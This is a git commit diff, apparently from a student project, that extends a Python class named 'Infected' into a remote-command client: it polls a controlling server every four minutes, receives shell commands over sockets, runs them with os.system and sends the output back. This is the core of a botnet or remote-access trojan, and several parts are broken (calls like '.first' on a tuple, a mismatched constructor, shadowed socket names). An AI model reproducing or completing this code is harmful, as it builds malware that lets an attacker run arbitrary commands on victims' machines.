480124c391dd38fba0a4899aa72711e7d4471ce2
juanmottesi <juannpm159@gmail.com>
2015-10-17 23:02:22 -0300

    se realiza codigo parcial de la segunda opcion mensionada en el mail

--- Proyect/Infected.py
+++ Proyect/Infected.py
@@ -1,9 +1,11 @@
 import os
 import socket
-class Infected:
+from threading import Thread
+from time import sleep
+class Infected(Thread):
     mySocket = 0 ;
     myUser = "";
-
+    action = None
 
     def __init__(self,ip,port):
         self.ServerSocket = (ip,port)
@@ -17,7 +19,6 @@ class Infected:
     def apply(self):
         self.mySocket.connect(self.ServerSocket)
         
-        
     def reciveCommand(self,command):
         
         data = os.system(command)
@@ -29,3 +30,66 @@ class Infected:
     def sendData(self,data):
         self.mySocket.send(data)
         self.mySocket.close()
+        
+    def closeConnection(self):
+        self.mySocket.close()
+        
+    def getAction(self):
+        return self.mySocket.recv(100)
+
+    def run(self):
+        while True:
+            self.takeIp()
+            self.apply()
+            
+            actionToDo = self.getAction()
+            
+            if actionToDo == self.action:
+                self.closeConnection()
+        
+            else:
+                self.action = actionToDo
+                self.closeConnection()
+                ExecuteCommand(self.ServerSocket.first, self.ServerSocket.second +1 ).start() # aca podria tener un puerto especifico definido antes
+                
+            sleep(240) # 4 min 
+        
+        
+        
+        
+######### Inicio de  Funcion global ######### 
+def establishConnection(ip, puerto):
+    socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    socket.connect((ip, puerto))
+    return socket
+
+def executeCommand(command):
+    return os.system(command)
+
+######### Fin de  Funcion global #########
+
+class ExecuteCommand(Thread):
+    
+    def __init__(self, ip, port, bufSize):
+        self.ip = ip
+        self.port = port
+        self.bufSize = bufSize
+       
+    def run(self):
+        socket = establishConnection(self.ip, self.port)
+        command = socket.recv(self.bufSize)  #buffer size ni idea cuanto ponerle 
+        socket.close()
+        data = executeCommand(command)
+        SendOutputForConsole(data, self.ip, (self.port+1) ).start() # aca podria tener un puerto especifico definido antes
+
+class SendOutputForConsole(Thread):
+    
+    def __init__(self, data, ip, port):
+        self.data = data
+        self.ip = ip
+        self.port = port
+        
+    def run(self):        
+        socket = establishConnection(self.ip, self.port)
+        socket.sendall(self.data)
+        socket.close()
